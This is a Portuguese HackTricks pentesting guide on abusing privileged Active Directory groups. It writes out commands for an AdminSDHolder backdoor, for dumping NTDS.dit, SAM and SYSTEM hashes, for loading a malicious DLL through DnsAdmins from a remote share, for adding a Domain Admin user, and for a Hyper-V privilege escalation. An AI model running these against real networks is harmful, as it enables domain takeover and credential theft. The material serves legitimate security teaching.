# Grupos privilegiados

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Grupos conhecidos com privilégios de administração

* **Administradores**
* **Administradores de Domínio**
* **Administradores de Empresa**

Existem outras associações de contas e privilégios de token de acesso que também podem ser úteis durante avaliações de segurança ao encadear vários vetores de ataque.

## Operadores de Conta <a href="#operadores-de-conta" id="operadores-de-conta"></a>

* Permite criar contas e grupos não administradores no domínio
* Permite fazer login no DC localmente

Obter **membros** do grupo:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Observe a associação de usuários do usuário "spotless":

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

No entanto, ainda podemos adicionar novos usuários:

![](../../.gitbook/assets/a2.png)

Bem como fazer login no DC01 localmente:

![](../../.gitbook/assets/a3.png)

## Grupo AdminSDHolder

A Lista de Controle de Acesso (ACL) do objeto **AdminSDHolder** é usada como um modelo para **copiar** **permissões** para **todos os "grupos protegidos"** no Active Directory e seus membros. Grupos protegidos incluem grupos privilegiados como Domain Admins, Administrators, Enterprise Admins e Schema Admins.\
Por padrão, a ACL deste grupo é copiada dentro de todos os "grupos protegidos". Isso é feito para evitar alterações intencionais ou acidentais nesses grupos críticos. No entanto, se um invasor modificar a ACL do grupo **AdminSDHolder**, por exemplo, dando permissões completas a um usuário comum, esse usuário terá permissões completas em todos os grupos dentro do grupo protegido (em uma hora).\
E se alguém tentar excluir esse usuário dos Domain Admins (por exemplo) em uma hora ou menos, o usuário voltará para o grupo.

Obter **membros** do grupo:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
Adicione um usuário ao grupo **AdminSDHolder**:
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
Verifique se o usuário está dentro do grupo **Domain Admins**:
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Se você não quiser esperar uma hora, pode usar um script do PS para fazer a restauração acontecer instantaneamente: [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**Mais informações em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **Lixeira de Reciclagem do AD**

Este grupo concede permissão para ler objetos AD excluídos. Algumas informações interessantes podem ser encontradas lá:
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Acesso ao Controlador de Domínio

Observe como não podemos acessar arquivos no DC com a adesão atual:

![](../../.gitbook/assets/a4.png)

No entanto, se o usuário pertencer a `Operadores de Servidor`:

![](../../.gitbook/assets/a5.png)

A história muda:

![](../../.gitbook/assets/a6.png)

### Privesc <a href="#backup-operators" id="backup-operators"></a>

Use o [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) ou `sc`, do Sysinternals, para verificar as permissões em um serviço.
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

        [ALLOW] BUILTIN\Server Operators
                All
```
Isso confirma que o grupo Server Operators tem o direito de acesso [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), o que nos dá controle total sobre este serviço. Você pode abusar deste serviço para [**fazer o serviço executar comandos arbitrários**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path) e escalar privilégios.

## Operadores de Backup <a href="#backup-operators" id="backup-operators"></a>

Assim como a adesão aos `Operadores de Servidor`, podemos **acessar o sistema de arquivos do `DC01`** se pertencermos aos `Operadores de Backup`.

Isso ocorre porque este grupo concede aos seus **membros** os privilégios [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) e [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5). O privilégio **SeBackupPrivilege** nos permite **atravessar qualquer pasta e listar** o conteúdo da pasta. Isso nos permitirá **copiar um arquivo de uma pasta**, mesmo que nada mais esteja dando permissões. No entanto, para abusar dessas permissões para copiar um arquivo, a flag [**FILE\_FLAG\_BACKUP\_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) \*\*\*\* deve ser usada. Portanto, são necessárias ferramentas especiais.

Para este propósito, você pode usar [**esses scripts**](https://github.com/giuliano108/SeBackupPrivilege)**.**

Obtenha os **membros** do grupo:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **Ataque Local**
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### Ataque AD

Por exemplo, você pode acessar diretamente o sistema de arquivos do Controlador de Domínio:

![](../../.gitbook/assets/a7.png)

Você pode abusar desse acesso para **roubar** o banco de dados do Active Directory **`NTDS.dit`** para obter todos os **hashes NTLM** de todos os objetos de usuário e computador no domínio.

Usando o [**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow), você pode **criar uma cópia de sombra** do **`C` drive** e no drive `F`, por exemplo. Então, você pode roubar o arquivo `NTDS.dit` dessa cópia de sombra, pois ele não estará em uso pelo sistema:
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
Assim como no ataque local, agora você pode copiar o arquivo privilegiado **`NTDS.dit`**:
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Outra maneira de copiar arquivos é usando o [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**:**
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
Então, você pode facilmente **roubar** o **SYSTEM** e o **SAM**:
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
Finalmente, você pode **obter todos os hashes** do **`NTDS.dit`**:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
## DnsAdmins

Um usuário que é membro do grupo **DNSAdmins** ou tem **privilégios de gravação em um servidor DNS** pode carregar uma **DLL arbitrária** com privilégios de **SYSTEM** no **servidor DNS**.\
Isso é realmente interessante, já que os **Controladores de Domínio** são **usados** com muita frequência como **servidores DNS**.

Conforme mostrado neste \*\*\*\* [**post**](https://adsecurity.org/?p=4064), o seguinte ataque pode ser realizado quando o DNS é executado em um Controlador de Domínio (o que é muito comum):

* A gestão do DNS é realizada sobre RPC
* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) nos permite **carregar** uma **DLL personalizada sem verificação** do caminho da DLL. Isso pode ser feito com a ferramenta `dnscmd` a partir da linha de comando
* Quando um membro do grupo **`DnsAdmins`** executa o comando **`dnscmd`** abaixo, a chave do registro `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` é populada
* Quando o **serviço DNS é reiniciado**, a **DLL** neste caminho será **carregada** (ou seja, um compartilhamento de rede que a conta de máquina do Controlador de Domínio pode acessar)
* Um atacante pode carregar uma **DLL personalizada para obter um shell reverso** ou até mesmo carregar uma ferramenta como o Mimikatz como uma DLL para despejar credenciais.

Obter **membros** do grupo:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Executar DLL arbitrária

Em seguida, se você tiver um usuário dentro do grupo **DNSAdmins**, você pode fazer com que o servidor DNS carregue uma DLL arbitrária com privilégios de **SYSTEM** (o serviço DNS é executado como `NT AUTHORITY\SYSTEM`). Você pode fazer com que o servidor DNS carregue um arquivo DLL **local ou remoto** (compartilhado por SMB) executando:
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
Um exemplo de uma DLL válida pode ser encontrada em [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL). Eu mudaria o código da função `DnsPluginInitialize` para algo como:
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
		system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
		system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
Ou você pode gerar um dll usando o msfvenom:
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Então, quando o serviço de **DNS** é iniciado ou reiniciado, um novo usuário será criado.

Mesmo tendo um usuário dentro do grupo DNSAdmin, **por padrão você não pode parar e reiniciar o serviço de DNS**. Mas você sempre pode tentar fazer:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
[**Saiba mais sobre essa escalada de privilégios em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

#### Mimilib.dll

Conforme detalhado neste [**post**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), também é possível usar o [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) do criador da ferramenta `Mimikatz` para obter a execução de comandos, **modificando** o arquivo [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) para executar um **reverse shell** ou outro comando de nossa escolha.

### Registro WPAD para MitM

Outra maneira de **abusar dos privilégios do grupo DnsAdmins** é criando um registro **WPAD**. A adesão a este grupo nos dá o direito de [desativar a segurança de bloqueio de consulta global](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), que por padrão bloqueia esse ataque. O servidor 2008 introduziu pela primeira vez a capacidade de adicionar a uma lista de bloqueio de consulta global em um servidor DNS. Por padrão, o Protocolo de Descoberta Automática de Proxy da Web (WPAD) e o Protocolo de Endereçamento Automático de Túnel Intra-Site (ISATAP) estão na lista de bloqueio de consulta global. Esses protocolos são bastante vulneráveis ​​a sequestro, e qualquer usuário do domínio pode criar um objeto de computador ou registro DNS contendo esses nomes.

Após **desativar a lista de bloqueio de consulta global** e criar um registro **WPAD**, **todas as máquinas** que executam o WPAD com as configurações padrão terão seu **tráfego proxy por meio de nossa máquina de ataque**. Poderíamos usar uma ferramenta como \*\*\*\* [**Responder**](https://github.com/lgandx/Responder) **ou** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **para realizar spoofing de tráfego**, e tentar capturar hashes de senha e quebrá-los offline ou realizar um ataque SMBRelay.

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Leitores de Log de Eventos

Os membros do grupo [**Leitores de Log de Eventos**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) \*\*\*\* têm **permissão para acessar os logs de eventos** gerados (como os logs de criação de novos processos). Nos logs, **informações sensíveis** podem ser encontradas. Vamos ver como visualizar os logs:
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## Permissões do Windows Exchange

Os membros são concedidos a capacidade de **escrever um DACL no objeto do domínio**. Um invasor pode abusar disso para **dar a um usuário** privilégios de [**DCSync**](dcsync.md).\
Se o Microsoft Exchange estiver instalado no ambiente AD, é comum encontrar contas de usuário e até mesmo computadores como membros deste grupo.

Este [**repositório do GitHub**](https://github.com/gdedrouas/Exchange-AD-Privesc) explica algumas **técnicas** para **escalar privilégios** abusando das permissões deste grupo.
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Administradores do Hyper-V

O grupo **Administradores do Hyper-V** tem acesso total a todos os recursos do [Hyper-V](https://docs.microsoft.com/pt-br/windows-server/manage/windows-admin-center/use/manage-virtual-machines). Se os **Controladores de Domínio** foram **virtualizados**, então os **administradores de virtualização** devem ser considerados **Administradores de Domínio**. Eles podem facilmente **criar um clone do Controlador de Domínio ativo** e **montar** o **disco** virtual offline para obter o arquivo **`NTDS.dit`** e extrair os hashes de senha NTLM de todos os usuários do domínio.

Também está bem documentado neste [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/) que, ao **excluir** uma máquina virtual, o `vmms.exe` tenta **restaurar as permissões originais do arquivo** correspondente ao **`.vhdx`** e o faz como `NT AUTHORITY\SYSTEM`, sem se passar pelo usuário. Podemos **excluir o arquivo `.vhdx`** e **criar** um **hard link** nativo para apontar este arquivo para um arquivo **protegido do sistema**, e você terá permissões completas para ele.

Se o sistema operacional for vulnerável a [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) ou [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), podemos aproveitar isso para obter privilégios do **SYSTEM**. Caso contrário, podemos tentar **aproveitar uma aplicação no servidor que tenha instalado um serviço em execução no contexto do SYSTEM**, que pode ser iniciado por usuários não privilegiados.

### **Exemplo de exploração**

Um exemplo disso é o **Firefox**, que instala o **`Mozilla Maintenance Service`**. Podemos atualizar [este exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (uma prova de conceito para o hard link NT) para conceder ao nosso usuário atual permissões completas no arquivo abaixo:
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Tomando posse do arquivo**

Após executar o script do PowerShell, devemos ter **controle total deste arquivo e podemos tomar posse dele**.
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Iniciando o Serviço de Manutenção da Mozilla**

Em seguida, podemos substituir este arquivo por um **`maintenanceservice.exe` malicioso**, **iniciar** o serviço de manutenção e obter a execução de comandos como SYSTEM.
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
Este vetor foi mitigado pelas atualizações de segurança do Windows de março de 2020, que mudaram o comportamento relacionado aos links rígidos.
{% endhint %}

## Gerenciamento de Organização

Este grupo também está presente em ambientes com o **Microsoft Exchange** instalado. Os membros deste grupo podem **acessar** as **caixas de correio** de **todos** os usuários do domínio. Este grupo também tem **controle total** da OU chamada `Microsoft Exchange Security Groups`, que contém o grupo [**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions) \*\*\*\* (siga o link para ver como abusar deste grupo para privesc).

## Operadores de Impressão

Os membros deste grupo recebem:

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **Logon localmente em um Controlador de Domínio** e desligá-lo
* Permissões para **gerenciar**, criar, compartilhar e excluir **impressoras conectadas a um Controlador de Domínio**

{% hint style="warning" %}
Se o comando `whoami /priv` não mostrar o **`SeLoadDriverPrivilege`** em um contexto não elevado, você precisa contornar o UAC.
{% endhint %}

Obter **membros** do grupo:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
## Usuários de Área de Trabalho Remota

Membros deste grupo podem acessar os PCs por meio do RDP.\
Obter **membros** do grupo:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Mais informações sobre **RDP**:

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## Usuários de Gerenciamento Remoto

Membros deste grupo podem acessar PCs via **WinRM**.
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Mais informações sobre **WinRM**:

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## Operadores de Servidor <a href="#server-operators" id="server-operators"></a>

Esta associação permite que os usuários configurem Controladores de Domínio com os seguintes privilégios:

* Permitir logon localmente
* Fazer backup de arquivos e diretórios
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) e [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* Alterar a hora do sistema
* Alterar o fuso horário
* Forçar desligamento de um sistema remoto
* Restaurar arquivos e diretórios
* Desligar o sistema
* Controlar serviços locais

Obter **membros** do grupo:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referências <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
